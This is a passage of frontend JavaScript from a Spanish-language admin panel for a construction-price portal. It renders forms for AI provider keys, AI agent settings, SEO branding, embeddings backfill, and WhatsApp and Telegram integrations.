            ${icon('check', 16)} Conexion exitosa — Proveedor: ${esc(resp.data.provider)}, Modelo: ${esc(resp.data.model)}
        </div>`;
    } else {
        resultEl.innerHTML = `<div style="background:#fee2e2;color:#991b1b;padding:10px;border-radius:8px;font-size:13px">
            ${icon('x', 16)} Error: ${esc(resp.error || resp.detail || 'Fallo desconocido')}
        </div>`;
    }
}

// ── Company AI Config (in company profile) ────────────────────
async function renderCompanyAIConfig(companyId) {
    const container = document.getElementById('company-ai-section');
    if (!container) return;

    const resp = await API.companyAIConfig(companyId);
    if (!resp.ok) { container.innerHTML = '<p>Error cargando config IA</p>'; return; }

    const { config, providers } = resp.data;
    const hasConfig = config && config.api_key;

    const providerOptions = providers.map(p => `
        <option value="${p.key}" ${config && p.key === config.provider ? 'selected' : ''}>
            ${esc(p.label)}${p.free_tier ? ' ★ GRATIS' : ''}
        </option>
    `).join('');

    const providersJson = JSON.stringify(providers.reduce((acc, p) => {
        acc[p.key] = { models: p.models, default_model: p.default_model, help_url: p.help_url };
        return acc;
    }, {}));

    container.innerHTML = `
        <div class="company-section">
            <h3>${icon('globe', 18)} Configuracion de IA</h3>
            <p style="color:var(--gray-500);font-size:13px;margin-bottom:12px">
                Configura tu propia API key para extraccion de documentos. Si no configuras una, se usa la del sistema.
            </p>
            ${hasConfig ? `
                <div style="background:var(--gray-50);padding:12px;border-radius:8px;font-size:13px;margin-bottom:12px">
                    <div><strong>Proveedor:</strong> ${esc(config.provider)}</div>
                    <div><strong>Modelo:</strong> ${esc(config.model)}</div>
                    <div><strong>API Key:</strong> ●●●●●●${config.api_key.slice(-4)}</div>
                    <button class="btn btn-sm btn-danger" style="margin-top:8px" onclick="removeCompanyAI(${companyId})">Eliminar (usar config del sistema)</button>
                </div>
            ` : '<p style="font-size:13px;color:var(--gray-400);margin-bottom:12px">Usando configuracion del sistema.</p>'}
            <form onsubmit="handleSaveCompanyAI(event, ${companyId})">
                <input type="hidden" id="company-ai-providers-data" value="${esc(providersJson)}">
                <div style="display:grid;grid-template-columns:1fr 1fr;gap:12px">
                    <div class="form-group">
                        <label class="form-label">Proveedor</label>
                        <select class="form-input" id="company-ai-provider" name="provider" onchange="onCompanyAIProviderChange()" required>
                            <option value="">-- Seleccionar --</option>
                            ${providerOptions}
                        </select>
                    </div>
                    <div class="form-group">
                        <label class="form-label">Modelo</label>
                        <select class="form-input" id="company-ai-model" name="model">
                            <option value="">Default</option>
                        </select>
                    </div>
                </div>
                <div class="form-group">
                    <label class="form-label">API Key</label>
                    <input class="form-input" name="api_key" type="password" placeholder="sk-..." value="${hasConfig ? esc(config.api_key) : ''}" required>
                    <a id="company-ai-help-link" href="#" target="_blank" style="font-size:12px;color:var(--primary)">Obtener API Key</a>
                </div>
                <button type="submit" class="btn btn-primary btn-sm">${icon('check', 14)} Guardar Config IA</button>
            </form>
        </div>
    `;

    if (config && config.provider) onCompanyAIProviderChange();
}

function onCompanyAIProviderChange() {
    const sel = document.getElementById('company-ai-provider');
    const provider = sel.value;
    const dataEl = document.getElementById('company-ai-providers-data');
    if (!dataEl || !provider) return;

    let providers;
    try { providers = JSON.parse(dataEl.value); } catch { return; }
    const info = providers[provider];
    if (!info) return;

    const modelSel = document.getElementById('company-ai-model');
    modelSel.innerHTML = info.models.map(m =>
        `<option value="${m}" ${m === info.default_model ? 'selected' : ''}>${m}</option>`
    ).join('');

    const helpLink = document.getElementById('company-ai-help-link');
    if (helpLink) helpLink.href = info.help_url;
}

async function handleSaveCompanyAI(e, companyId) {
    e.preventDefault();
    const f = e.target;
    const resp = await API.updateCompanyAIConfig(companyId, {
        provider: f.provider.value,
        api_key: f.api_key.value,
        model: f.model.value,
    });
    if (resp.ok) {
        toast('Config IA de empresa guardada', 'success');
        renderCompanyAIConfig(companyId);
    } else {
        toast(resp.detail || 'Error', 'error');
    }
}

async function removeCompanyAI(companyId) {
    if (!confirm('Eliminar config IA? Se usara la del sistema.')) return;
    const resp = await API.deleteCompanyAIConfig(companyId);
    if (resp.ok) {
        toast('Config IA eliminada', 'success');
        renderCompanyAIConfig(companyId);
    } else {
        toast(resp.detail || 'Error', 'error');
    }
}

// ── Admin: AI Agents ─────────────────────────────────────────
async function renderAdminAgents() {
    const c = document.getElementById('admin-content');
    c.innerHTML = '<div class="loading">Cargando agentes...</div>';

    const resp = await API.adminAgents();
    if (!resp.ok) { c.innerHTML = '<p>Error cargando agentes</p>'; return; }

    const { agents, agent_types, providers } = resp.data;

    // Type info map
    const typeMap = {};
    agent_types.forEach(t => { typeMap[t.key] = t; });

    // Agent type cards to create new ones
    const typeCards = agent_types.map(t => `
        <button class="agent-type-card" onclick="showAgentForm('${t.key}')">
            <span class="agent-type-ico" style="background:${t.bg};color:${t.color}">${icon(t.icon, 20)}</span>
            <div>
                <strong>${esc(t.label)}</strong>
                <p>${esc(t.description)}</p>
            </div>
        </button>
    `).join('');

    // Existing agents
    const agentCards = agents.length ? agents.map(a => {
        const t = typeMap[a.agent_type] || { label: a.agent_type, icon: 'cpu', color: '#64748b', bg: '#f1f5f9' };
        const channelTags = Object.entries(a.channels || {})
            .filter(([, v]) => v)
            .map(([k]) => `<span class="agent-channel-tag">${esc(k)}</span>`)
            .join('');
        return `
        <div class="agent-card ${a.is_active ? '' : 'agent-inactive'}">
            <div class="agent-card-header">
                <span class="agent-type-ico" style="background:${t.bg};color:${t.color}">${icon(t.icon, 18)}</span>
                <div class="agent-card-info">
                    <div class="agent-card-name">${esc(a.name)}</div>
                    <div class="agent-card-type">${esc(t.label)}${a.model ? ' — ' + esc(a.model) : a.provider ? ' — ' + esc(a.provider) : ' — Config global'}</div>
                </div>
                <div class="agent-card-status ${a.is_active ? 'active' : 'inactive'}">${a.is_active ? 'Activo' : 'Inactivo'}</div>
            </div>
            ${channelTags ? '<div class="agent-channels">' + channelTags + '</div>' : ''}
            <div class="agent-card-actions">
                <button class="btn btn-sm btn-secondary" onclick="showAgentForm('${a.agent_type}', ${a.id})">${icon('edit',14)} Editar</button>
                <button class="btn btn-sm btn-secondary" onclick="toggleAgent(${a.id})">${a.is_active ? icon('x',14) + ' Desactivar' : icon('zap',14) + ' Activar'}</button>
                <button class="btn btn-sm btn-secondary" onclick="testAgent(${a.id})">${icon('play',14)} Probar</button>
                <button class="btn btn-sm btn-danger" onclick="deleteAgent(${a.id})">${icon('trash',14)}</button>
            </div>
            <div id="agent-test-${a.id}" style="margin-top:6px"></div>
        </div>`;
    }).join('') : '<div class="empty-state"><p>No hay agentes configurados. Crea uno eligiendo un tipo arriba.</p></div>';

    c.innerHTML = `
        <h2 class="adm-title">${icon('cpu', 22)} Agentes AI</h2>
        <p style="color:var(--gray-500);font-size:14px;margin:-12px 0 16px">
            Configura trabajadores inteligentes que buscan, actualizan, detectan coincidencias
            y se comunican con proveedores via WhatsApp, Telegram y redes sociales.
        </p>

        <div class="integ-section">
            <h3 style="margin-bottom:12px">Crear Agente</h3>
            <div class="agent-types-grid">${typeCards}</div>
        </div>

        <div class="integ-section">
            <h3 style="margin-bottom:12px">Agentes Configurados (${agents.length})</h3>
            <div class="agent-list">${agentCards}</div>
        </div>
    `;
}

async function showAgentForm(agentType, agentId) {
    // Load providers and existing agent data if editing
    const resp = await API.adminAgents();
    if (!resp.ok) return;

    const { agent_types, providers } = resp.data;
    const typeInfo = agent_types.find(t => t.key === agentType) || {};
    let agent = null;

    if (agentId) {
        agent = resp.data.agents.find(a => a.id === agentId);
    }

    const providerOptions = providers.map(p =>
        `<option value="${p.key}" ${(agent?.provider || '') === p.key ? 'selected' : ''}>${esc(p.label)}</option>`
    ).join('');

    // Build model suggestions from all providers
    const allModels = providers.flatMap(p => p.models);
    const modelDatalist = allModels.map(m => `<option value="${m}">`).join('');

    const channelChecks = ['whatsapp', 'telegram', 'facebook', 'webhook', 'email'].map(ch => {
        const checked = agent?.channels?.[ch] ? 'checked' : '';
        return `<label style="display:flex;align-items:center;gap:6px;font-size:13px;cursor:pointer">
            <input type="checkbox" name="channel_${ch}" ${checked}> ${ch.charAt(0).toUpperCase() + ch.slice(1)}
        </label>`;
    }).join('');

    const triggerChecks = [
        ['on_new_quotation', 'Nueva cotizacion recibida'],
        ['on_price_update', 'Precio actualizado'],
        ['on_new_supplier', 'Nuevo proveedor registrado'],
        ['on_message', 'Mensaje entrante (webhook)'],
        ['cron_daily', 'Ejecucion diaria (cron)'],
    ].map(([key, label]) => {
        const checked = agent?.triggers?.[key] ? 'checked' : '';
        return `<label style="display:flex;align-items:center;gap:6px;font-size:13px;cursor:pointer">
            <input type="checkbox" name="trigger_${key}" ${checked}> ${label}
        </label>`;
    }).join('');

    const html = `
        <div class="modal-header">
            <h3 class="modal-title">${agentId ? 'Editar' : 'Crear'} Agente: ${esc(typeInfo.label || agentType)}</h3>
            <button class="modal-close" onclick="closeModal()">&times;</button>
        </div>
        <div class="modal-body">
            <form id="agent-form" onsubmit="handleSaveAgent(event, ${agentId || 'null'}, '${agentType}')">
                <div class="form-group">
                    <label class="form-label">Nombre del agente</label>
                    <input class="form-input" name="name" value="${esc(agent?.name || typeInfo.label || '')}" required placeholder="Ej: Buscador Principal">
                </div>

                <div style="display:grid;grid-template-columns:1fr 1fr;gap:12px">
                    <div class="form-group">
                        <label class="form-label">Proveedor <small style="font-weight:400;color:var(--gray-400)">(vacio = config global)</small></label>
                        <select class="form-input" name="provider">
                            <option value="">Usar config global</option>
                            ${providerOptions}
                        </select>
                    </div>
                    <div class="form-group">
                        <label class="form-label">Modelo <small style="font-weight:400;color:var(--gray-400)">(escribir custom OK)</small></label>
                        <input class="form-input" name="model" list="agent-model-list" value="${esc(agent?.model || '')}" placeholder="Default del proveedor">
                        <datalist id="agent-model-list">${modelDatalist}</datalist>
                    </div>
                </div>

                <div class="form-group">
                    <label class="form-label">API Key <small style="font-weight:400;color:var(--gray-400)">(vacio = key global)</small></label>
                    <input class="form-input" type="password" name="api_key" value="" placeholder="${agent?.api_key_set ? '●●● (ya configurada, dejar vacio para mantener)' : 'sk-...'}">
                </div>

                <div class="form-group">
                    <label class="form-label">System Prompt</label>
                    <textarea class="form-input" name="system_prompt" rows="4" placeholder="Instrucciones para el agente...">${esc(agent?.system_prompt || typeInfo.default_prompt || '')}</textarea>
                </div>

                <div style="display:grid;grid-template-columns:1fr 1fr;gap:16px;margin-bottom:14px">
                    <div>
                        <label class="form-label">Canales</label>
                        <div style="display:flex;flex-wrap:wrap;gap:8px 16px">${channelChecks}</div>
                    </div>
                    <div>
                        <label class="form-label">Triggers</label>
                        <div style="display:flex;flex-direction:column;gap:6px">${triggerChecks}</div>
                    </div>
                </div>

                <div class="modal-footer" style="padding:0;border:none;margin-top:16px">
                    <button type="button" class="btn btn-secondary" onclick="closeModal()">Cancelar</button>
                    <button type="submit" class="btn btn-primary">${icon('check', 16)} ${agentId ? 'Guardar' : 'Crear Agente'}</button>
                </div>
            </form>
        </div>
    `;

    openModal(html);
}

async function handleSaveAgent(e, agentId, agentType) {
    e.preventDefault();
    const f = e.target;

    const channels = {};
    ['whatsapp', 'telegram', 'facebook', 'webhook', 'email'].forEach(ch => {
        const cb = f.querySelector(`[name="channel_${ch}"]`);
        if (cb) channels[ch] = cb.checked;
    });

    const triggers = {};
    ['on_new_quotation', 'on_price_update', 'on_new_supplier', 'on_message', 'cron_daily'].forEach(key => {
        const cb = f.querySelector(`[name="trigger_${key}"]`);
        if (cb) triggers[key] = cb.checked;
    });

    const data = {
        name: f.name.value.trim(),
        agent_type: agentType,
        provider: f.provider.value,
        model: f.model.value.trim(),
        system_prompt: f.system_prompt.value.trim(),
        channels,
        triggers,
    };

    // Only send api_key if user entered something
    if (f.api_key.value) {
        data.api_key = f.api_key.value;
    }

    let resp;
    if (agentId) {
        resp = await API.adminUpdateAgent(agentId, data);
    } else {
        resp = await API.adminCreateAgent(data);
    }

    if (resp.ok) {
        toast(agentId ? 'Agente actualizado' : 'Agente creado', 'success');
        closeModal();
        renderAdminAgents();
    } else {
        toast(resp.detail || resp.error || 'Error', 'error');
    }
}

async function toggleAgent(id) {
    const resp = await API.adminToggleAgent(id);
    if (resp.ok) {
        toast(resp.data.is_active ? 'Agente activado' : 'Agente desactivado', 'success');
        renderAdminAgents();
    } else {
        toast(resp.detail || 'Error', 'error');
    }
}

async function testAgent(id) {
    const el = document.getElementById(`agent-test-${id}`);
    if (el) el.innerHTML = '<small style="color:var(--gray-400)">Probando...</small>';

    const resp = await API.adminTestAgent(id);
    if (!el) return;

    if (resp.ok) {
        el.innerHTML = `<small style="color:#166534">${icon('check',12)} OK — ${esc(resp.data.model)}</small>`;
    } else {
        el.innerHTML = `<small style="color:#991b1b">${icon('x',12)} ${esc(resp.error || 'Error')}</small>`;
    }
}

async function deleteAgent(id) {
    if (!confirm('Eliminar este agente?')) return;
    const resp = await API.adminDeleteAgent(id);
    if (resp.ok) {
        toast('Agente eliminado', 'success');
        renderAdminAgents();
    } else {
        toast(resp.detail || 'Error', 'error');
    }
}

// ── Admin: SEO Config ────────────────────────────────────────
async function renderAdminSEO() {
    const c = document.getElementById('admin-content');
    c.innerHTML = '<div class="loading">Cargando configuracion SEO...</div>';

    const resp = await API.adminSeoConfig();
    if (!resp.ok) { c.innerHTML = '<p>Error cargando config SEO</p>'; return; }

    const cfg = resp.data || {};

    c.innerHTML = `
        <h2 style="margin-bottom:8px">${icon('globe', 20)} Configuracion SEO y Branding</h2>
        <p style="color:var(--gray-500);margin-bottom:20px;font-size:14px">
            Configura el nombre, descripcion, imagen y datos de contacto de tu sitio. Estos datos se usan en metadatos SEO, Open Graph y el footer.
        </p>
        <form id="seo-form" onsubmit="handleSaveSEO(event)">
            <div class="form-group">
                <label class="form-label">Nombre del sitio</label>
                <input class="form-input" name="site_name" value="${esc(cfg.site_name || '')}" placeholder="Nexo Base">
            </div>
            <div class="form-group">
                <label class="form-label">Titulo de la pagina (title tag)</label>
                <input class="form-input" name="site_title" value="${esc(cfg.site_title || '')}" placeholder="Nexo Base | Precios y Proveedores de Construccion en Bolivia">
            </div>
            <div class="form-group">
                <label class="form-label">Meta descripcion</label>
                <textarea class="form-input" name="site_description" rows="3" placeholder="Portal de precios unitarios de materiales de construccion...">${esc(cfg.site_description || '')}</textarea>
            </div>
            <div class="form-group">
                <label class="form-label">Keywords (separadas por coma)</label>
                <input class="form-input" name="site_keywords" value="${esc(cfg.site_keywords || '')}" placeholder="precios construccion bolivia, materiales, cemento...">
            </div>
            <div style="display:grid;grid-template-columns:1fr 1fr;gap:12px">
                <div class="form-group">
                    <label class="form-label">Imagen Open Graph (URL)</label>
                    <input class="form-input" name="og_image" value="${esc(cfg.og_image || '')}" placeholder="https://ejemplo.com/og-image.jpg">
                </div>
                <div class="form-group">
                    <label class="form-label">Color del tema</label>
                    <div style="display:flex;gap:8px;align-items:center">
                        <input type="color" id="seo-theme-color" value="${cfg.theme_color || '#1e40af'}" onchange="document.querySelector('[name=theme_color]').value=this.value" style="width:40px;height:36px;border:none;cursor:pointer">
                        <input class="form-input" name="theme_color" value="${esc(cfg.theme_color || '#1e40af')}" placeholder="#1e40af" style="flex:1" onchange="document.getElementById('seo-theme-color').value=this.value">
                    </div>
                </div>
            </div>
            <div class="form-group">
                <label class="form-label">Texto del footer</label>
                <input class="form-input" name="footer_text" value="${esc(cfg.footer_text || '')}" placeholder="Nexo Base - Precios y proveedores de construccion en Bolivia">
            </div>
            <div style="display:grid;grid-template-columns:1fr 1fr;gap:12px">
                <div class="form-group">
                    <label class="form-label">Email de contacto</label>
                    <input class="form-input" type="email" name="contact_email" value="${esc(cfg.contact_email || '')}" placeholder="info@ejemplo.com">
                </div>
                <div class="form-group">
                    <label class="form-label">WhatsApp de contacto</label>
                    <input class="form-input" name="contact_whatsapp" value="${esc(cfg.contact_whatsapp || '')}" placeholder="+591 70000000">
                </div>
            </div>
            <div class="form-group">
                <label class="form-label">Google Analytics ID</label>
                <input class="form-input" name="analytics_id" value="${esc(cfg.analytics_id || '')}" placeholder="G-XXXXXXXXXX">
            </div>
            <button type="submit" class="btn btn-primary" style="margin-top:8px;width:100%;justify-content:center;padding:10px">
                ${icon('check', 16)} Guardar Configuracion SEO
            </button>
        </form>

        <div style="margin-top:24px;padding:16px;background:var(--gray-50);border-radius:10px">
            <h3 style="font-size:14px;margin-bottom:8px">Vista previa en buscadores</h3>
            <div style="font-size:16px;color:#1a0dab;font-weight:500">${esc(cfg.site_title || 'Nexo Base | Precios y Proveedores de Construccion en Bolivia')}</div>
            <div style="font-size:13px;color:#006621;margin:2px 0">${window.location.origin}</div>
            <div style="font-size:13px;color:#545454">${esc((cfg.site_description || 'Portal de precios unitarios de materiales de construccion en Bolivia.').substring(0, 160))}</div>
        </div>
    `;
}

async function handleSaveSEO(e) {
    e.preventDefault();
    const f = e.target;
    const data = {
        site_name: f.site_name.value,
        site_title: f.site_title.value,
        site_description: f.site_description.value,
        site_keywords: f.site_keywords.value,
        og_image: f.og_image.value,
        theme_color: f.theme_color.value,
        footer_text: f.footer_text.value,
        contact_email: f.contact_email.value,
        contact_whatsapp: f.contact_whatsapp.value,
        analytics_id: f.analytics_id.value,
    };
    const resp = await API.adminUpdateSeoConfig(data);
    if (resp.ok) {
        toast('Configuracion SEO guardada', 'success');
        applySiteConfig(data);
        renderAdminSEO();
    } else {
        toast(resp.detail || 'Error guardando SEO', 'error');
    }
}

// ── Admin: Embeddings (semantic search) ──────────────────────
let _embeddingsBackfillRunning = false;

async function renderAdminEmbeddings() {
    const c = document.getElementById('admin-content');
    c.innerHTML = '<div class="loading">Cargando configuracion...</div>';
    const [cfgResp, statusResp] = await Promise.all([
        API.adminEmbeddingsConfig().catch(() => ({ ok: false })),
        API.adminEmbeddingsStatus().catch(() => ({ ok: false })),
    ]);
    if (!cfgResp.ok) { c.innerHTML = '<p>Error cargando configuracion</p>'; return; }

    const cfg = cfgResp.data;
    const providers = cfgResp.providers || [];
    const st = statusResp.ok ? statusResp : null;

    const pct = st && st.active > 0 ? Math.round((st.with_embedding / st.active) * 100) : 0;
    const missing = st ? st.missing : 0;

    const providerOpts = providers.map(p => `
        <option value="${esc(p.key)}" ${cfg.provider === p.key ? 'selected' : ''}>${esc(p.key.toUpperCase())}</option>
    `).join('');

    c.innerHTML = `
        <h2 class="adm-title">${icon('search',22)} Busqueda semantica (embeddings)</h2>
        <p class="adm-subtitle">La busqueda inteligente usa embeddings para encontrar productos por sinonimos y frases similares. Elige un provider, pega tu API key y corre el backfill.</p>

        <div class="adm-card" style="margin-bottom:16px">
            <h3 style="margin:0 0 12px">Configuracion del provider</h3>
            <div style="display:grid;gap:12px">
                <label>
                    <div style="font-size:12px;color:var(--gray-600);margin-bottom:4px">Provider</div>
                    <select id="emb-provider" class="form-input" onchange="_embProviderChanged()">
                        ${providerOpts}
                    </select>
                </label>
                <label>
                    <div style="font-size:12px;color:var(--gray-600);margin-bottom:4px">Modelo</div>
                    <select id="emb-model" class="form-input"></select>
                </label>
                <label>
                    <div style="font-size:12px;color:var(--gray-600);margin-bottom:4px">
                        API Key ${cfg.configured ? `<span style="color:var(--success,#059669)">&middot; configurada (${esc(cfg.api_key_masked)})</span>` : '<span style="color:var(--warn,#b45309)">&middot; sin configurar</span>'}
                    </div>
                    <input id="emb-api-key" class="form-input" type="password" placeholder="${cfg.configured ? 'Dejar vacio para mantener la actual' : 'sk-... o AI...'}" autocomplete="off">
                </label>
                <div style="display:flex;gap:8px;flex-wrap:wrap">
                    <button class="btn btn-primary" onclick="saveEmbeddingsConfig()">${icon('save',14)} Guardar configuracion</button>
                </div>
                <div style="font-size:12px;color:var(--gray-500);line-height:1.5">
                    <strong>OpenAI</strong>: 1536 dims (3-small) &middot; API key en <a href="https://platform.openai.com/api-keys" target="_blank" rel="noopener">platform.openai.com</a>.
                    <br><strong>Gemini</strong>: 768 dims (text-embedding-004) &middot; API key en <a href="https://aistudio.google.com/apikey" target="_blank" rel="noopener">aistudio.google.com</a>.
                    <br>Cada provider se guarda en una columna distinta, asi podes cambiar sin perder embeddings previos.
                </div>
            </div>
        </div>

        <div class="adm-card">
            <h3 style="margin:0 0 12px">Estado del indice</h3>
            ${st ? `
                <div style="display:grid;grid-template-columns:repeat(auto-fit,minmax(140px,1fr));gap:12px;margin-bottom:14px">
                    <div><div style="font-size:11px;color:var(--gray-500);text-transform:uppercase">Provider activo</div><div style="font-size:18px;font-weight:700">${esc(st.provider || '-')}</div></div>
                    <div><div style="font-size:11px;color:var(--gray-500);text-transform:uppercase">Modelo</div><div style="font-size:14px">${esc(st.model || '-')} <small>(${st.dims || '-'}d)</small></div></div>
                    <div><div style="font-size:11px;color:var(--gray-500);text-transform:uppercase">Productos activos</div><div style="font-size:18px;font-weight:700">${st.active}</div></div>
                    <div><div style="font-size:11px;color:var(--gray-500);text-transform:uppercase">Con embedding</div><div style="font-size:18px;font-weight:700;color:var(--success,#059669)">${st.with_embedding} <small>(${pct}%)</small></div></div>
                    <div><div style="font-size:11px;color:var(--gray-500);text-transform:uppercase">Faltantes</div><div style="font-size:18px;font-weight:700;color:${missing > 0 ? 'var(--warn,#b45309)' : 'var(--gray-400)'}">${missing}</div></div>
                </div>
                <div style="height:6px;background:var(--gray-100);border-radius:3px;overflow:hidden;margin-bottom:14px">
                    <div style="height:100%;width:${pct}%;background:var(--primary,#2563eb);transition:width 0.3s"></div>
                </div>
            ` : '<p style="color:var(--gray-500)">No se pudo leer el estado del indice (pgvector no disponible?).</p>'}
            <div style="display:flex;gap:8px;flex-wrap:wrap">
                <button class="btn btn-primary" onclick="runEmbeddingsBackfill()" ${!cfg.configured || missing === 0 ? 'disabled' : ''}>
                    ${icon('refresh',14)} Procesar ${missing > 0 ? missing + ' ' : ''}faltantes
                </button>
                <button class="btn btn-secondary" onclick="renderAdminEmbeddings()">${icon('refresh',14)} Refrescar</button>
            </div>
            <div id="emb-backfill-log" style="margin-top:14px;font-size:12px;color:var(--gray-600);font-family:monospace;white-space:pre-wrap;max-height:240px;overflow:auto"></div>
        </div>
    `;

    _embProviderChanged(providers);
    // Exponer providers para el handler
    window._embProviders = providers;
    window._embCurrentCfg = cfg;
}

function _embProviderChanged(providersArg) {
    const providers = providersArg || window._embProviders || [];
    const prov = document.getElementById('emb-provider')?.value;
    if (!prov) return;
    const spec = providers.find(p => p.key === prov);
    if (!spec) return;
    const sel = document.getElementById('emb-model');
    const currentModel = (window._embCurrentCfg?.provider === prov) ? window._embCurrentCfg.model : spec.default_model;
    sel.innerHTML = spec.models.map(m =>
        `<option value="${esc(m.name)}" ${m.name === currentModel ? 'selected' : ''}>${esc(m.name)} &middot; ${m.dims}d</option>`
    ).join('');
}

async function saveEmbeddingsConfig() {
    const provider = document.getElementById('emb-provider').value;
    const model = document.getElementById('emb-model').value;
    const apiKey = document.getElementById('emb-api-key').value.trim();
    if (!provider || !model) { toast('Provider y modelo son requeridos', 'error'); return; }

    // Si el provider cambio y no hay api_key ingresada, forzar que ingresen una
    const currentProvider = window._embCurrentCfg?.provider;
    if (!apiKey && provider !== currentProvider) {
        toast('Ingresa la API key para el nuevo provider', 'error'); return;
    }
    if (!apiKey && !window._embCurrentCfg?.configured) {
        toast('Ingresa la API key', 'error'); return;
    }

    const resp = await API.adminEmbeddingsSetConfig({ provider, model, api_key: apiKey });
    if (resp.ok) {
        toast(`Provider actualizado: ${resp.data.provider} / ${resp.data.model} (${resp.data.dims}d)`, 'success');
        renderAdminEmbeddings();
    } else {
        toast(resp.detail || 'Error guardando config', 'error');
    }
}

async function runEmbeddingsBackfill() {
    if (_embeddingsBackfillRunning) return;
    _embeddingsBackfillRunning = true;
    const logEl = document.getElementById('emb-backfill-log');
    const append = (msg) => { if (logEl) logEl.textContent += msg + '\n'; logEl.scrollTop = logEl.scrollHeight; };
    if (logEl) logEl.textContent = '';

    try {
        let totalUpdated = 0;
        let iter = 0;
        while (iter < 50) {  // hard stop 50 iteraciones (~5000 por tick)
            iter++;
            append(`[${new Date().toLocaleTimeString()}] Procesando batch ${iter}...`);
            const resp = await API.adminEmbeddingsBackfill(100, 10);
            if (!resp.ok) { append(`ERROR: ${resp.error || resp.detail || 'fallo'}`); break; }
            totalUpdated += resp.updated || 0;
            append(`  +${resp.updated} embedded, ${resp.failed} failed · total con embedding: ${resp.with_embedding}/${resp.active} · faltan: ${resp.missing}`);
            if (!resp.missing || resp.missing === 0) {
                append(`OK Listo. Total embebidos: ${totalUpdated}`);
                break;
            }
            if (!resp.batches_done) {
                append('Sin progreso. Abortando.');
                break;
            }
        }
    } catch (e) {
        append(`Excepcion: ${e}`);
    } finally {
        _embeddingsBackfillRunning = false;
        // Refrescar stats sin rerender completo
        const st = await API.adminEmbeddingsStatus().catch(() => null);
        if (st?.ok) {
            append(`\nEstado final: ${st.with_embedding}/${st.active} con embedding (${st.missing} faltantes)`);
        }
    }
}

// ── Admin: Integrations ──────────────────────────────────────
async function renderAdminIntegrations() {
    const c = document.getElementById('admin-content');
    c.innerHTML = '<div class="loading">Cargando integraciones...</div>';

    const resp = await API.adminIntegrations();
    if (!resp.ok) { c.innerHTML = '<p>Error cargando integraciones</p>'; return; }
    const d = resp.data;

    c.innerHTML = `
        <h2 class="adm-title">${icon('globe',22)} Integraciones</h2>

        <!-- URL Publica -->
        <div class="integ-section">
            <div class="integ-header">
                <span class="integ-icon" style="background:#e0e7ff;color:#4338ca">${icon('globe',20)}</span>
                <div>
                    <h3>URL Publica del Portal</h3>
                    <p>Necesaria para registrar webhooks de Telegram y WhatsApp</p>
                </div>
            </div>
            <form onsubmit="saveIntegrations(event,'public')">
                <div class="form-group">
                    <label class="form-label">URL publica (HTTPS)</label>
                    <input class="form-input" name="public_url" value="${esc(d.public_url || '')}" placeholder="https://apu-marketplace-app.q8waob.easypanel.host">
                    ${!d.public_url ? '<small style="color:var(--red-500)">No configurada — los webhooks no funcionaran con localhost</small>' : ''}
                </div>
                <button type="submit" class="btn btn-primary">${icon('check',16)} Guardar</button>
            </form>
        </div>

        <!-- WhatsApp / Evolution API — Multi-instance -->
        <div class="integ-section">
            <div class="integ-header">
                <span class="integ-icon" style="background:#dcfce7;color:#16a34a">${icon('whatsapp',20)}</span>
                <div>
                    <h3>WhatsApp (Evolution API)</h3>
                    <p>Multiples instancias de Evolution API para diferentes numeros o servidores</p>
                </div>
            </div>
            <div class="form-group">
                <label class="form-label">Webhook URL (configura esto en cada instancia de Evolution API)</label>
                <div class="integ-webhook-url" onclick="navigator.clipboard.writeText(this.textContent);toast('Copiado','success')">${esc(d.webhook_whatsapp)}</div>
            </div>
            <div id="wa-instances-list">
                ${(d.evolution_instances && d.evolution_instances.length > 0) ? d.evolution_instances.map((inst, idx) => `
                    <div class="wa-instance-card" data-id="${esc(inst.id)}">
                        <div class="wa-instance-header">
                            <span class="wa-instance-label">${esc(inst.label || 'Instancia ' + (idx+1))}${inst.is_default ? ' <span class="badge badge-success" style="font-size:10px">Default</span>' : ''}</span>
                            <div style="display:flex;gap:4px">
                                <button type="button" class="btn btn-sm btn-secondary" onclick="testWaInstance('${escJs(inst.id)}')" title="Probar">${icon('play',14)}</button>
                                ${!inst.is_default ? `<button type="button" class="btn btn-sm btn-secondary" onclick="setDefaultWaInstance('${escJs(inst.id)}')" title="Hacer default">${icon('check',14)}</button>` : ''}
                                <button type="button" class="btn btn-sm btn-secondary" onclick="editWaInstance('${escJs(inst.id)}')" title="Editar">${icon('edit',14)}</button>
                                <button type="button" class="btn btn-sm" style="color:var(--red-500)" onclick="removeWaInstance('${escJs(inst.id)}')" title="Eliminar">${icon('x',14)}</button>
                            </div>
                        </div>
                        <div class="wa-instance-details">
                            <span>${icon('globe',12)} ${esc(inst.url)}</span>
                            <span>${icon('server',12)} ${esc(inst.instance_name)}</span>
                            <span>${icon('lock',12)} ${esc(inst.api_key_masked || '***')}</span>
                        </div>
                        <div class="wa-instance-health" data-health-slot="${esc(inst.id)}" style="margin-top:8px;display:flex;gap:8px;align-items:center;font-size:12px;color:var(--gray-500)">
                            <span data-slot="conn">${icon('clock',12)} Cargando...</span>
                            <span data-slot="webhook"></span>
                        </div>
                    </div>
                `).join('') : `
                    <div style="text-align:center;padding:20px;color:var(--gray-400)">
                        <p>No hay instancias configuradas</p>
                        <p style="font-size:12px">La configuracion legacy (URL/Key/Instance del .env) se usara como fallback</p>
                    </div>
                `}
            </div>
            <button type="button" class="btn btn-primary" onclick="addWaInstance()" style="margin-top:12px">${icon('plus',16)} Agregar Instancia</button>
            <div id="wa-test-result" style="margin-top:8px"></div>
        </div>

        <!-- Telegram -->
        <div class="integ-section">
            <div class="integ-header">
                <span class="integ-icon" style="background:#dbeafe;color:#1e40af">${icon('send',20)}</span>
                <div>
                    <h3>Telegram Bot</h3>
                    <p>Recibe y envia cotizaciones via Telegram</p>
                </div>
            </div>
            <form onsubmit="saveIntegrations(event,'telegram')">
                <div style="display:grid;grid-template-columns:1fr 1fr;gap:12px">
                    <div class="form-group">
                        <label class="form-label">Bot Token</label>
                        <input class="form-input" name="telegram_bot_token" type="password" value="${esc(d.telegram_bot_token)}" placeholder="123456:ABC-DEF...">
                    </div>
                    <div class="form-group">
                        <label class="form-label">Webhook Secret</label>
                        <input class="form-input" name="telegram_webhook_secret" value="${esc(d.telegram_webhook_secret)}" placeholder="mi-secreto">
                    </div>
                </div>
                <div class="form-group">
                    <label class="form-label">Webhook URL</label>
                    <div class="integ-webhook-url" onclick="navigator.clipboard.writeText(this.textContent);toast('Copiado','success')">${esc(d.webhook_telegram)}</div>
                </div>
                <div style="display:flex;gap:8px;flex-wrap:wrap">
                    <button type="submit" class="btn btn-primary">${icon('check',16)} Guardar</button>
                    <button type="button" class="btn btn-secondary" onclick="setupTelegramWebhook()">Registrar Webhook</button>
